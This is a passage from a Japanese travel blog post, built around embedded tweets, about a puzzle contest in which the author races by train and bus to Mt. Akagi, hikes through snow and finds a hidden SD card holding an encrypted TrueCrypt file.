<blockquote class="twitter-tweet" lang="ja"><p>5本じゃない4本だし！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885923290030082">2015, 4月 6</a></blockquote>


<p>衝撃です。平日の前橋駅発赤城山行きのバスは4本しかなく、4本目が最終折り返し便という記載がバス時刻表にあることを初めて知りました。</p>

<p><img src="/blog/resources/images//bus-table.png" alt="bus-table" /></p>

<p>平日の前橋駅発富士見温泉経由赤城山行きの出発時刻は7:32、10:35、13:27、15:28の4本しかなく、15:28の便が最終折り返し便なので、なんとしてでも13:27のバスに乗らなければならない状況に立たされていることを知ります。
悠長に電車旅を続けられる状態ではなくなりました。本数の少ない路線を乗り継いでいるため、一つでも乗り換えを間違えたり間に合わなかったりすると13:27のバスに間に合わず、そこでmondai10へのチャレンジ終了となります。</p>

<p>ギリギリの乗り換えを迫られているがため、春日部駅で10:26発の久喜行きの電車が目の前で去った時は、乗り換え失敗をしたと勘違いし、焦ってこんなツイートをしていました（乗り換え案内によると10:36発の久喜行きに乗ればよいとのことでした）。</p>

<blockquote class="twitter-tweet" lang="ja"><p>あかん乗り換えミスったやばいぞ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 春日部駅 (Kasukabe Sta.) in 春日部市, 埼玉県) <a href="https://t.co/4d9tnWBHpQ">https://t.co/4d9tnWBHpQ</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584890215510192129">2015, 4月 6</a></blockquote>


<p>なんとか春日部駅での乗り換えを成功し、電車の中でこんなことを考えていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>新幹線乗ればよかった感</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584891590436454400">2015, 4月 6</a></blockquote>


<p>運賃をできるだけ安く済ませようと、有料特急を乗り換え案内の検索条件から外していたのですが、埼玉県の大宮駅で新幹線に乗って群馬県の高崎駅へ行く経路をとれば、乗り換えも少なく、時間に余裕を持って前橋駅まで行くことができたのです。</p>

<p>続く2駅も、途中2分という短い乗り換え時間でありながらも、乗り遅れることなく無事乗り換えることに成功しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 久喜駅 (Kuki Sta.) in 久喜市, 埼玉県) <a href="https://t.co/Xm0SXXYVs7">https://t.co/Xm0SXXYVs7</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584895933697159168">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>乗り換え可能時間2分しかないぞ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584903863565594624">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>乗り換え成功 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 館林駅 (Tatebayashi Sta.) in 館林市, 群馬県) <a href="https://t.co/zCyWnEyjHF">https://t.co/zCyWnEyjHF</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584905684585750528">2015, 4月 6</a></blockquote>


<p>さて、普通にプラットホームを移動して乗り換えするだけでよかったのはこの館林駅まで。次の乗り換え駅である足利市駅では時間との戦いが待っているのです。</p>

<p><img src="/blog/resources/images//running-connection.png" alt="running-connection" /></p>

<p>足利市駅での乗り換えでは、違う路線の駅間を歩いて移動しなければならないのです。この乗り換えの最大の難関は移動時間。足利市駅に11:47に到着し足利駅の発車時刻は12:05で、その間の時間は18分しかありません。徒歩での経路をiOSのマップで調べてみると、予想所要時間は18分となっています。迷ったり道を間違えたりしていたら乗り損ねてしまい、mondai10チャレンジ終了となります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>東武鉄道遅延情報出てないのに遅延してるクズっぽい</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584910433590517760">2015, 4月 6</a></blockquote>


<p>追い討ちをかけるように、東武鉄道は2分ほど足利市駅への到着が遅れていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>駅間ダッシュだっ！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 足利市駅 (Ashikagashi Sta.) in 足利市, 栃木県) <a href="https://t.co/nvG8VXUlrI">https://t.co/nvG8VXUlrI</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584910796683157504">2015, 4月 6</a></blockquote>


<p>11:49に駅に到着し、足利駅への移動を開始します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>いきなり迷ってる <a href="https://twitter.com/hashtag/%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0CTF?src=hash">#エクストリームCTF</a> <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584911355313917953">2015, 4月 6</a></blockquote>


<p>駅の出口が2方向にあり、どちらに出ればいいかわからず、さらに出口から出たところで道らしき道が見当たらなかったため、2分ほど迷ってしまいました。</p>

<p>iPhoneの電子コンパスを使って方角を確かめ、正しい出口から出てマップを頼りに急いで移動を開始します。</p>

<p><img src="/blog/resources/images//connection-map.png" alt="connection-map" /></p>

<p>駅間の移動中の風景はとてものどかで、ゆっくりとした時間が流れているようでした。ゆっくりと時間が流れて欲しいと思っていたからかもしれませんが。
橋を渡っている時に撮った渡良瀬川の風景は、特に面白みがなく自然な感じでした。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/v9Jca4uFE4">pic.twitter.com/v9Jca4uFE4</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584911834458689536">2015, 4月 6</a></blockquote>


<p><a href="/blog/resources/images//IMG_2374.JPG"><img src="/blog/resources/images//IMG_2374_thumb.JPG" alt="IMG_2374.JPG" /></a>
<a href="/blog/resources/images//IMG_2375.JPG"><img src="/blog/resources/images//IMG_2375_thumb.JPG" alt="IMG_2375.JPG" /></a></p>

<p>のんびりと写真を撮っていたからでしょうか、駅まで残り250mの地点ですでに電車出発まで残り2分を切ってしまいました。</p>

<p><img src="/blog/resources/images//last_250m.png" alt="last_250m" /></p>

<p>猛ダッシュするしかありません。幸い、信号のある道ではなかったので歩道を存分に走って駅に向かうことができました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ギリッギリw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 足利駅 (Ashikaga Sta.) in 足利市, 栃木県) <a href="https://t.co/tkic86CCmO">https://t.co/tkic86CCmO</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584914938298261504">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>最後猛ダッシュだったわw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584915058506870784">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>あと30秒遅かったらリタイアだったわ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584915558820225025">2015, 4月 6</a></blockquote>


<p>駅の改札を通ると高崎行き方面のホームにはすでに電車が！ふくらはぎパンパンになりながらも階段を駆け上がり、なんとか電車に間に合い乗ることができました。</p>

<p>ちなみに足利駅には電車が飾ってありました。（こんなの撮影してないで急げというツッコミはなしで）</p>

<p><a href="/blog/resources/images//IMG_2379.JPG"><img src="/blog/resources/images//IMG_2379_thumb.JPG" alt="IMG_2379.JPG" /></a></p>

<p>最後の乗り換えを終え、あとは前橋駅で降りるだけとなりました。なんとか電車で赤城山最寄駅までこぎつけることができる状態となり、これにて過酷な電車乗り換え編はおしまいとなります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>とりあえず エクストリームCTF 午前の部 電車編 はクリアできたっぽいです</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584918614555238401">2015, 4月 6</a></blockquote>


<h3>昼の部　バス乗り換え編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>エクストリームCTF 昼の部 バス編開始です <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅 (Maebashi Sta.) in 前橋市, 群馬県) <a href="https://t.co/djgY3NCMZ9">https://t.co/djgY3NCMZ9</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584927608808288256">2015, 4月 6</a></blockquote>


<p>へとへとになりながらも降りそびれることなく、前橋駅に到着しました。</p>

<p>バスターミナルを回り、富士見温泉経由で赤城山に向かうバスを探します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>この13:27で行けるはず… <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅バスターミナル in 前橋市, 群馬県) <a href="https://t.co/zRGB3P2gof">https://t.co/zRGB3P2gof</a> <a href="http://t.co/utCcwl1PVN">pic.twitter.com/utCcwl1PVN</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584928918194540544">2015, 4月 6</a></blockquote>


<p>事前に（電車内で）調べてあった13:27発のバスがありました。しかし富士見温泉終点と書いてあるこのバスで本当に赤城山へ行けるか心配になり、バス案内所へ行きどの便でいけるのかを聞いてきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>心配になってバス案内所で聞いてきたら13:27の便であってた <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/s2Hfmuv4Jc">pic.twitter.com/s2Hfmuv4Jc</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584931886155239425">2015, 4月 6</a></blockquote>


<p>この13:27発の電車であっていたようです。一度富士見温泉で赤城山ビジターセンター行きのバスに乗り換えをする必要があるとのことでした。</p>

<p>案内所にあったバス停の停車場所の地図から、SDカードがある場所に一番近いバス停を探します。Google Mapによると、赤城山ビジターセンターまで行ってしまうと大回りとなってしまうとのことで、その一つ前の赤城山大洞で降りると、山道を通って最短経路で行けるとのことでした。</p>

<p><img src="/blog/resources/images//bus-stop-route.png" alt="bus-stop-route" /></p>

<p>時間になり、バスが来たので乗車しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>バス乗った　<a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934452813365248">2015, 4月 6</a></blockquote>


<p>ここで想定していなかった事態が発生します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>雨降ってきたし！！！</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934838643195904">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雨降るなんて聞いてないよ！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934887217500160">2015, 4月 6</a></blockquote>


<p>天気予報では&#8221;晴れ&#8221;となっていたので雨具など用意していません。しかもバスに乗るまで20分ほど待ち時間があったので、乗車前に降りそうな予感がしていれば雨合羽を買うことすらできただけに、最悪のタイミングで雨が降ってきました。このままSDカードを見つけることができるのかと、とても不安になってきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>まんがタイムきららのドキドキビジュアルコミックス以上にドキドキしてる</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584937029898612736">2015, 4月 6</a></blockquote>


<p>ぼーっと外を眺めていても、雨粒と曇天とでかい鳥居くらいしかなく、ぜんぜん落ち着きませんでした。</p>

<blockquote class="twitter-tweet" lang="ja"><p>でかい鳥居だ <a href="http://t.co/9xRZJc8ODm">pic.twitter.com/9xRZJc8ODm</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584941636108451840">2015, 4月 6</a></blockquote>


<p>そうこうしていると富士見温泉バス停に着き、乗り換えをしました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 富士見温泉バス停) <a href="https://t.co/NDft6XwqIr">https://t.co/NDft6XwqIr</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584943568017588224">2015, 4月 6</a></blockquote>


<p>赤城山ビジターセンター行きのバスに乗ると、風景に大きな山が見えてきました。たぶん赤城山です。たぶん。</p>

<p><a href="/blog/resources/images//IMG_2388.JPG"><img src="/blog/resources/images//IMG_2388_thumb.JPG" alt="IMG_2388.JPG" /></a>
<a href="/blog/resources/images//IMG_2391.JPG"><img src="/blog/resources/images//IMG_2391_thumb.JPG" alt="IMG_2391.JPG" /></a></p>

<p>バスで揺られて眠くなる中、標高1000mを越えたあたりから車窓から覗く景色が明るくなっていることに気づきます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>標高1000m超えた</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584950108011110400">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>残雪があるぞ…</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584951262354939905">2015, 4月 6</a></blockquote>


<p>そう、残雪が景色を明るくしていたのです。また、赤城山大沼という湖は湖面が凍っていました。</p>

<p><a href="/blog/resources/images//IMG_2395.JPG"><img src="/blog/resources/images//IMG_2395_thumb.JPG" alt="IMG_2395.JPG" /></a>
<a href="/blog/resources/images//IMG_2398.JPG"><img src="/blog/resources/images//IMG_2398_thumb.JPG" alt="IMG_2398.JPG" /></a></p>

<p>赤城山大洞バス停に到着し、降車します。降りるとき、バスの運転手にこう告げられました。</p>

<blockquote><p>バス停が雪に埋まってるから帰りは降りた位置辺りにいれば止まるよ</p></blockquote>

<p>嫌な予感しかしません。</p>

<p>ここから想像をはるかに超える過酷な登山が始まります。</p>

<h3>午後1　登山編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>さぁ、登山開始だ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 赤城山第1スキー場 in 前橋市, 群馬県) <a href="https://t.co/tHRXadHe4S">https://t.co/tHRXadHe4S</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584954825294684160">2015, 4月 6</a></blockquote>


<p>バス停を降りてすぐのところで登山者向けの案内看板を見つけました。</p>

<p><a href="/blog/resources/images//IMG_2399.JPG"><img src="/blog/resources/images//IMG_2399_thumb.JPG" alt="IMG_2399.JPG" /></a></p>

<p>この看板の略図にある地蔵岳を越えてゆくコースを通ってSDカードの場所へと向かいます。看板の凡例にあるように、通る道は<strong>歩道</strong>となっているので比較的楽に登ることができると思いまいした。その歩道とやらはどこにあるのかとあたりを見渡すと、アスファルトで舗装された道がみつかりました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>どうすんだよこれ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/3DeQWYKK8V">pic.twitter.com/3DeQWYKK8V</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584955092714950656">2015, 4月 6</a></blockquote>


<p>かろうじてアスファルトの道であるとわかる雪に覆われた登山道を見つけます。100mほど先を見ると、アスファルトはすべて雪に覆われ見えなくなっています。
完全に想像していなかった事態です。春になり暖かくなってきていたので、こんなにも雪が積もっているなんて考えていませんでした。
出発前の甘い考えがここで思い出されます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ヤマノススメするぞといった気持ち</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584858646346989568">2015, 4月 5</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00L3NPW7E" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>何も下調べせずに来てしまったことを強く後悔しました。
事前にしっかりと下調べしていれば、1800m超級の山にはまだ雪が残っているというのは安易に想像がつきます。小爪アイゼン装備のブーツを持ってくることもできたのです。</p>

<p>よく滑る雪道を数十メートル進み、湖の方を眺めると大きな山がこちらを見守ってくれていました。</p>

<p><a href="/blog/resources/images//IMG_2403.JPG"><img src="/blog/resources/images//IMG_2403_thumb.JPG" alt="IMG_2403.JPG" /></a></p>

<p>刻々と帰りのバスの時間が迫ってきているので、後悔はほどほどに先に進みます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>やばい(確信) <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/NsTmOr6ZL2">pic.twitter.com/NsTmOr6ZL2</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584956357419241472">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>なんで沢登りせにゃならんのだw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/5c72fEWBQc">pic.twitter.com/5c72fEWBQc</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584958094637015040">2015, 4月 6</a></blockquote>


<p>膝上まで沈む深い雪があるところや、雪解け水で小川ができているところを水浸しになりながらかけ進んでいきます。</p>

<p><a href="/blog/resources/images//IMG_2405.JPG"><img src="/blog/resources/images//IMG_2405_thumb.JPG" alt="IMG_2405.JPG" /></a>
<a href="/blog/resources/images//IMG_2410.JPG"><img src="/blog/resources/images//IMG_2410_thumb.JPG" alt="IMG_2410.JPG" /></a>
<a href="/blog/resources/images//IMG_2412.JPG"><img src="/blog/resources/images//IMG_2412_thumb.JPG" alt="IMG_2412.JPG" /></a>
<a href="/blog/resources/images//IMG_2413.JPG"><img src="/blog/resources/images//IMG_2413_thumb.JPG" alt="IMG_2413.JPG" /></a>
<a href="/blog/resources/images//IMG_2414.JPG"><img src="/blog/resources/images//IMG_2414_thumb.JPG" alt="IMG_2414.JPG" /></a></p>

<blockquote class="twitter-tweet" lang="ja"><p>Googleさんの案内相当険しかったですね。。これマップの地点の画像です <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/OthdUPcczu">pic.twitter.com/OthdUPcczu</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584976426962530305">2015, 4月 6</a></blockquote>


<p>20分ほど登ったでしょうか、地蔵岳の登山道を抜け、車道に出てきました。</p>

<p><a href="/blog/resources/images//IMG_2415.JPG"><img src="/blog/resources/images//IMG_2415_thumb.JPG" alt="IMG_2415.JPG" /></a></p>

<p>やっと雪道から解放されました。</p>

<p>少し進むと小沼という湖がでてきました。</p>

<p><a href="/blog/resources/images//IMG_2416.JPG"><img src="/blog/resources/images//IMG_2416_thumb.JPG" alt="IMG_2416.JPG" /></a>
<a href="/blog/resources/images//IMG_2417.JPG"><img src="/blog/resources/images//IMG_2417_thumb.JPG" alt="IMG_2417.JPG" /></a>
<a href="/blog/resources/images//IMG_2418.JPG"><img src="/blog/resources/images//IMG_2418_thumb.JPG" alt="IMG_2418.JPG" /></a>
<a href="/blog/resources/images//IMG_2419.JPG"><img src="/blog/resources/images//IMG_2419_thumb.JPG" alt="IMG_2419.JPG" /></a>
<a href="/blog/resources/images//IMG_2420.JPG"><img src="/blog/resources/images//IMG_2420_thumb.JPG" alt="IMG_2420.JPG" /></a></p>

<p>標高1450m地点とのことです。あと一息で目的地周辺です。
凍った湖を左手に眺めながら車道脇をてくてくと歩き進んでいきます。</p>

<p><a href="/blog/resources/images//IMG_2422.JPG"><img src="/blog/resources/images//IMG_2422_thumb.JPG" alt="IMG_2422.JPG" /></a>
<a href="/blog/resources/images//IMG_2424.JPG"><img src="/blog/resources/images//IMG_2424_thumb.JPG" alt="IMG_2424.JPG" /></a>
<a href="/blog/resources/images//IMG_2425.JPG"><img src="/blog/resources/images//IMG_2425_thumb.JPG" alt="IMG_2425.JPG" /></a>
<img src="/blog/resources/images//route-to-dest.png" alt="route-to-dest.png" /></p>

<p>目的地周辺まで来ました。このときiPhoneの電波は圏外となっていました。</p>

<p>ここからは車道を外れて森の中へと捜索しに行きます。</p>

<h3>午後2　捜索編</h3>

<p>登山道が60cm超の雪まみれだったのにもかかわらず、SDカードが隠されている森は数cmの雪しかありませんでした。
不幸中の幸いというものですね。</p>

<p><a href="/blog/resources/images//IMG_2428.JPG"><img src="/blog/resources/images//IMG_2428_thumb.JPG" alt="IMG_2428.JPG" /></a>
<a href="/blog/resources/images//IMG_2429.JPG"><img src="/blog/resources/images//IMG_2429_thumb.JPG" alt="IMG_2429.JPG" /></a>
<a href="/blog/resources/images//IMG_2431.JPG"><img src="/blog/resources/images//IMG_2431_thumb.JPG" alt="IMG_2431.JPG" /></a>
<a href="/blog/resources/images//IMG_2433.JPG"><img src="/blog/resources/images//IMG_2433_thumb.JPG" alt="IMG_2433.JPG" /></a></p>

<p>道無き道を突き進んでいたのですが、途中で道らしきものを見つけそちらを歩き始めました。
すると、看板とともに分岐点があらわれました。</p>

<p>GPSによると、血の池方面に行けばよさそうなので、そちらへ進んでいきます。</p>

<p><a href="/blog/resources/images//IMG_2435.JPG"><img src="/blog/resources/images//IMG_2435_thumb.JPG" alt="IMG_2435.JPG" /></a>
<a href="/blog/resources/images//IMG_2437.JPG"><img src="/blog/resources/images//IMG_2437_thumb.JPG" alt="IMG_2437.JPG" /></a></p>

<p>血の池に着くと、血の池にまつわる伝説と池の由来が書かれた看板がありました。
この看板を読んでいると、すこし前に目にした単語を見つけました。
そう、hint7.txtに記載のあった<strong>ヤマヒゲナガケンミジンコ</strong>です。
なるほどがってん、あれはこの血の池を指していたんですね。</p>

<p>血の池の中心に来て辺りを見回すと、そこは静かな森でした。まぁ森に入って来たからあたりまえなのですが。</p>

<p><a href="/blog/resources/images//IMG_2441.JPG"><img src="/blog/resources/images//IMG_2441_thumb.JPG" alt="IMG_2441.JPG" /></a></p>

<p>地図を拡大し、GPSだけを頼りにSDカードの位置まで行くと、kanto1_1.jpgに写っているのと同じような岩がたくさんある場所へと来ました。</p>

<p><a href="/blog/resources/images//IMG_2445.JPG"><img src="/blog/resources/images//IMG_2445_thumb.JPG" alt="IMG_2445.JPG" /></a></p>

<p>よーくkanto1_1.jpgと目の前の岩岩を見比べ、それらしき岩を特定しました。</p>

<p><a href="/blog/resources/images//IMG_2446.JPG"><img src="/blog/resources/images//IMG_2446_thumb.JPG" alt="IMG_2446.JPG" /></a></p>

<p>mondai10.txtによると、<em>ヒント：石の下のミンティア</em>とのことなので、石をめくってみます。</p>

<p><a href="/blog/resources/images//IMG_2447.JPG"><img src="/blog/resources/images//IMG_2447_thumb.JPG" alt="IMG_2447.JPG" /></a>
<a href="/blog/resources/images//IMG_2449.JPG"><img src="/blog/resources/images//IMG_2449_thumb.JPG" alt="IMG_2449.JPG" /></a></p>

<p>ありました！ミンティアアップルフィズ味です！</p>

<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00MQE4MG6" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>気になる中身は&#8230;</p>

<p><a href="/blog/resources/images//IMG_2451.JPG"><img src="/blog/resources/images//IMG_2451_thumb.JPG" alt="IMG_2451.JPG" /></a></p>

<p><strong>待望のSDカードでした！やっとみつかりました！</strong>
9:24につくば駅から電車に乗り、15:24に発見したのでかれこれ6時間の旅でした。
ものすごい達成感とSDカードの中身への興味から、岩場に腰を下ろしSDカードをマウントしてみてみました。</p>

<p><a href="/blog/resources/images//IMG_2452.JPG"><img src="/blog/resources/images//IMG_2452_thumb.JPG" alt="IMG_2452.JPG" /></a></p>

<pre style="border:none; color:inherit; background-color:inherit;">
＿人人人人人人人＿
＞ mondai10.tc ＜
￣Y^Y^Y^Y^Y^Y￣
</pre>


<p>またこの形式か！mondai9で解いたのと同じ、パスワード付きTrueCryptファイルです。
パスワードのヒントはSDカード内にあることは容易に想像がつくので解析しようと思いましたが、
帰りのバスが1本しかない上に、ここからバス停まで何分かかるか不明なため、解析は後回しにしてとりあえず森を抜けることにします。
岩場のすぐ近くに県道へ抜ける道の案内看板があったので、それに従って車道へと出ます。</p>

<h3>午後3　帰宅編</h3>

<p><a href="/blog/resources/images//IMG_2454.JPG"><img src="/blog/resources/images//IMG_2454_thumb.JPG" alt="IMG_2454.JPG" /></a>
<a href="/blog/resources/images//IMG_2455.JPG"><img src="/blog/resources/images//IMG_2455_thumb.JPG" alt="IMG_2455.JPG" /></a>
<a href="/blog/resources/images//IMG_2457.JPG"><img src="/blog/resources/images//IMG_2457_thumb.JPG" alt="IMG_2457.JPG" /></a>
<a href="/blog/resources/images//IMG_2458.JPG"><img src="/blog/resources/images//IMG_2458_thumb.JPG" alt="IMG_2458.JPG" /></a></p>

<p>看板の指示通りに歩いていたら、あっさりと県道へと抜けることができ、さらに県道から血の池までの最短ルートとなる登山道の入り口の案内板がありました。
hint7.txtのヤマヒゲナガケンミジンコから血の池が導けていれば、道無き道を進む必要もなく、この看板から血の池へ向かうことができていたかもしれません。</p>

<p>車道へと出たのであとは道なりにバス停へと向かうことにします。
行きに降車した赤城山大洞バス停へは、あの<strong>険しい登山道</strong>を再度通らないといけないため、少し遠回りになりますが、赤城山ビジターセンターへと向かいます。
行きとは逆で、右手に小沼を眺めながら下っていきます。</p>

<p><a href="/blog/resources/images//IMG_2461.JPG"><img src="/blog/resources/images//IMG_2461_thumb.JPG" alt="IMG_2461.JPG" /></a>
<a href="/blog/resources/images//IMG_2462.JPG"><img src="/blog/resources/images//IMG_2462_thumb.JPG" alt="IMG_2462.JPG" /></a>
<a href="/blog/resources/images//IMG_2465.JPG"><img src="/blog/resources/images//IMG_2465_thumb.JPG" alt="IMG_2465.JPG" /></a>
<a href="/blog/resources/images//IMG_2466.JPG"><img src="/blog/resources/images//IMG_2466_thumb.JPG" alt="IMG_2466.JPG" /></a>
<a href="/blog/resources/images//IMG_2469.JPG"><img src="/blog/resources/images//IMG_2469_thumb.JPG" alt="IMG_2469.JPG" /></a></p>

<p>ただただ歩き進むだけだったので、何事もなく赤城山ビジターセンターに到着することができました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 赤城公園ビジターセンター in 前橋市, 群馬県) <a href="https://t.co/UE7XCVkwDv">https://t.co/UE7XCVkwDv</a> <a href="http://t.co/9EkxDzo5hO">pic.twitter.com/9EkxDzo5hO</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584974440947183616">2015, 4月 6</a></blockquote>


<p>赤城山ビジターセンターは閉まっていたので外のベンチに腰掛けました。</p>

<p>ビジターセンター横に、赤城山公園に関するお得な掲示板がありました。</p>

<p><a href="/blog/resources/images//IMG_2477.JPG"><img src="/blog/resources/images//IMG_2477_thumb.JPG" alt="IMG_2477.JPG" /></a></p>

<p>急いで降りてきた甲斐があってか、バスが来るまで1時間も余裕があったので、持って来たコーヒーと板チョコレートで休憩しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>バスが来るまで1時間あるのでチョコとコーヒーで休憩 <a href="http://t.co/RfTO5ZNJA8">pic.twitter.com/RfTO5ZNJA8</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584980254445305856">2015, 4月 6</a></blockquote>


<p>ここ赤城山ビジターセンターの標高は1365mなため、16:00を過ぎたこの時期は寒く、ダウンジャケットを準備しておいて正解でした。</p>

<blockquote class="twitter-tweet" lang="ja"><p>標高1400mはやっぱり寒い&#10;ダウンジャケット持ってきて正解だったわ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584977161729093632">2015, 4月 6</a></blockquote>


<p>チョコレートを食べ終わり、辺りを見回すと霞がかかってきました。</p>

